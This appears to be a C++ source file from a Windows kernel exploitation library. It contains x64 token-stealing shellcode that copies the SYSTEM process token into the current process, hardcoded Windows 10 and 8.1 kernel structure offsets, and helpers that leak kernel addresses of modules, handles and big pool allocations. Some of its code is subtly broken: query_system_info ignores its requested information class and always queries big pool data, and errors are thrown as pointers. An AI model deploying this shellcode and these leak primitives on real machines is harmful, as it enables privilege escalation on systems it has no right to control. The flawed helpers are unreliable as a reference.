#include "kernel.h"

#include "asm.h"
#include "log.h"
#include "nt.h"
#include <stdexcept>

#pragma comment(lib, "ntdll.lib")

using namespace pwn::log;


#ifndef __KERNEL_CONSTANTS__
#ifdef __WIN10__

//
// Offset for Win10 RS6 x64
//
#define CURRENT_ETHREAD             0x0188
#define EPROCESS_OFFSET             0x00b8
#define PROCESSID_OFFSET            0x02e8
#define EPROCESS_FLINK_OFFSET       0x02f0
#define TOKEN_OFFSET                0x0360
#define SYSTEM_PID                  4



#elif defined(__WIN81__)
#define CURRENT_ETHREAD   0x0188
#define EPROCESS_OFFSET   0x00b8
#define PROCESSID_OFFSET  0x02e0
#define FLINK_OFFSET      0x02e8
#define TOKEN_OFFSET      0x0348
#define SYSTEM_PID        0x4

#endif
#define __KERNEL_CONSTANTS__
#endif


namespace pwn::kernel
{
	namespace shellcode
	{
		namespace
		{

			std::vector<BYTE> __steal_system_token_x64(void)
			{
#ifdef PWN_NO_ASSEMBLER
                throw std::exception("This library wasn't compiled with assembly support");
#else
				const char* sc = ""
					"push rax ;"
					"push rbx ;"
					"push rcx ;"
					// nt!PsGetCurrentProcess
					"mov rax, gs:[" STR(CURRENT_ETHREAD) "] ;"
					"mov rax, [rax+" STR(EPROCESS_OFFSET) "] ;"
					"mov rbx, rax ;"
					"mov rbx, [rbx+" STR(EPROCESS_FLINK_OFFSET) "] ;"
					// look for SYSTEM EProcess
					"__loop: "
					"sub rbx, " STR(EPROCESS_FLINK_OFFSET) " ;"
					"mov rcx, [rbx+" STR(PROCESSID_OFFSET) "] ;"
					"cmp rcx, " STR(SYSTEM_PID) " ;"
					"jnz __loop ;"
					// get its token value
					"mov rcx, [rbx + " STR(TOKEN_OFFSET) "] ;"
					"and cl, 0xf0 ;"
					// overwrite our current process' token with it
					"mov [rax + " STR(TOKEN_OFFSET) "], rcx ;"
					"pop rcx ;"
					"pop rbx ;"
					"pop rax ;"
					"add rsp, 0x28 ;"
					"xor rax, rax ;"
					"ret ;";

				const size_t sclen = ::strlen(sc);
				std::vector<BYTE> out;
				if (!pwn::assm::x64(sc, sclen, out))
					throw std::runtime_error("failed to compile shellcode\n");
				return out;
#endif
			}
		}


		std::vector<BYTE> debug_break(void)
		{
			return std::vector<BYTE>({ 0x90, 0x90, 0xcc, 0xcc });
		}


		std::vector<BYTE> steal_system_token(void)
		{
#ifdef __x86_64__
			return __steal_system_token_x64();
#else
			return debug_break();
#endif
		}


	}


	std::unique_ptr<BYTE[]> query_system_info(_In_ SYSTEM_INFORMATION_CLASS code, _Out_ PSIZE_T pdwBufferLength)
	{
		NTSTATUS Status;
		ULONG BufferLength = 0, ExpectedBufferLength;
		std::unique_ptr<BYTE[]> Buffer;

		*pdwBufferLength = 1;

		do
		{
			Buffer = std::make_unique<BYTE[]>(BufferLength);
			Status = ::NtQuerySystemInformation(
				SystemBigPoolInformation,
				Buffer.get(),
				BufferLength,
				&ExpectedBufferLength
			);

			if (!NT_SUCCESS(Status))
			{
				if (Status == STATUS_INFO_LENGTH_MISMATCH)
				{
					BufferLength = ExpectedBufferLength;
					continue;
				}

				break;
			}

			break;
		}
		while (true);

		if (!NT_SUCCESS(Status))
		{
			::SetLastError(::RtlNtStatusToDosError(Status));
			return nullptr;
		}

		*pdwBufferLength = ExpectedBufferLength;
		return Buffer;
	}


	/*++
	Description:
		Get an iterable of tuple enumerating all the kernel modules, with their base address

	Arguments:
		None

	Return:
		Returns a vector of <wstring,ulong_ptr> of all the modules
	--*/
	std::vector< std::tuple<std::wstring, ULONG_PTR> > modules()
	{
		std::vector< std::tuple<std::wstring, ULONG_PTR> > mods;

		SIZE_T BufferLength;
		auto Buffer = query_system_info(SystemModuleInformation, &BufferLength);
		if (!Buffer)
		{
			throw new std::runtime_error("NtQuerySystemInformation()");
		}

		auto Modules = reinterpret_cast<PRTL_PROCESS_MODULES>(Buffer.get());
		dbg(L"Found %lu modules\n", Modules->NumberOfModules);

		for (DWORD i = 0; i < Modules->NumberOfModules; i++)
		{
			auto ModuleFullPathName = pwn::utils::to_widestring((const char*)Modules->Modules[i].FullPathName);
			std::tuple<std::wstring, ULONG_PTR> entry = std::make_tuple(ModuleFullPathName, (ULONG_PTR)Modules->Modules[i].ImageBase);
			mods.push_back(entry);
		}

		return mods;
	}


	/*++
	Description:
		Get the kernel module argument passed in argument base address.

	Arguments:
		- lpwszModuleName is a wide string for the name of the module to look up

	Return:
		Returns -1 on error, the address of the module on success
	--*/
	ULONG_PTR get_module_base_address(_In_ const std::wstring&  ModuleName)
	{
		std::wstring pattern(ModuleName);

		for (auto& mod : modules())
		{
			auto name = std::get<0>(mod);
			auto addr = std::get<1>(mod);

			if (pwn::utils::endswith(name, pattern))
			{
				dbg(L"Found %s base (%p)\n", pattern.c_str(), addr);
				return addr;
				break;
			}
		}

		::SetLastError(ERROR_NOT_FOUND);
		return (ULONG_PTR)-1;
	}


	/*++
	Description:
		Get the kernel address for the given handle number and PID.

	Arguments:
		- hTarget is the handle number
		- dwPid is the process with that handle

	Return:
		Returns -1 on error (sets last error), the kernel address of the handle
	--*/
	ULONG_PTR get_handle_kaddress(_In_ HANDLE hTarget, _In_ DWORD dwPid)
	{
		SIZE_T BufferLength;
		auto Buffer = query_system_info(SystemHandleInformation, &BufferLength);
		if (!Buffer)
		{
			throw new std::runtime_error("NtQuerySystemInformation()");
		}

		PSYSTEM_HANDLE_INFORMATION HandleTableInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(Buffer.get());

		dbg(L"Dumped %d entries\n",	HandleTableInfo->NumberOfHandles);
		for (ULONG i = 0; i < HandleTableInfo->NumberOfHandles; i++) 
		{
			SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleInfo = HandleTableInfo->Handles[i];

			if (
				HandleInfo.UniqueProcessId == dwPid &&
				(HANDLE)HandleInfo.HandleValue == hTarget
			)
			{
				dbg(L"Found HANDLE=%d OBJECT=%p\n",	HandleInfo.HandleValue,	HandleInfo.Object);
				return (ULONG_PTR)HandleInfo.Object;
			}
		}

		::SetLastError(ERROR_NOT_FOUND);
		return (ULONG_PTR)-1;
	}


	/*++
	Description:
		Get a vector of big pool chunks with the specified Tag

	Arguments:
		- Tag is a DWORD of the big pool tag to search for. If 0, all big pool chunks are returned.

	Return:
		A vector with the big pool kernel address with the specified tag
	--*/
	std::vector<ULONG_PTR> get_big_pool_kaddress(_In_ DWORD Tag)
	{
		std::vector<ULONG_PTR> res;

		SIZE_T BufferLength;
		auto Buffer = query_system_info(SystemBigPoolInformation, &BufferLength);
        if (!Buffer || BufferLength < 8)
		{
			throw new std::runtime_error("NtQuerySystemInformation()");
		}

		u32 PoolTableSize = (BufferLength - 8) / sizeof(BIG_POOL_INFO);
        PBIG_POOL_INFO PoolTableInfo = reinterpret_cast<PBIG_POOL_INFO>(Buffer.get() + 8);

		for (u32 i = 0; i < PoolTableSize; i++)
		{
			auto PoolInfo = reinterpret_cast<PBIG_POOL_INFO>(&PoolTableInfo[i]);
			
			if (Tag == 0 || PoolInfo->PoolTag == Tag)
			{
				dbg(L"Found PoolTag 0x%x at %p\n", PoolInfo->PoolTag, PoolInfo->Address);
				res.push_back(PoolInfo->Address);
			}
		}

		return res;
	}

}